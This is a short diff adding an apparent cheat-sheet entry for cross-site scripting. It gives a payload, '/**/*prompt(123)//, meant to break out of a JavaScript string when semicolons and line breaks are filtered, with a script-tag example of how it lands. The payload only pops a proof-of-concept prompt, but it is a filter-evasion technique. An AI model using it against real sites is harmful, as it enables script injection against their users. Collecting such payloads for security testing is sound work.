@@ -1,0 +1,6 @@
+When you can pass certain characters but not ; or you can't %0D or %0A try:
+'/**/*prompt(123)//
+
+<script>
+var a = 'a'/**/*prompt(123)//
+</script>
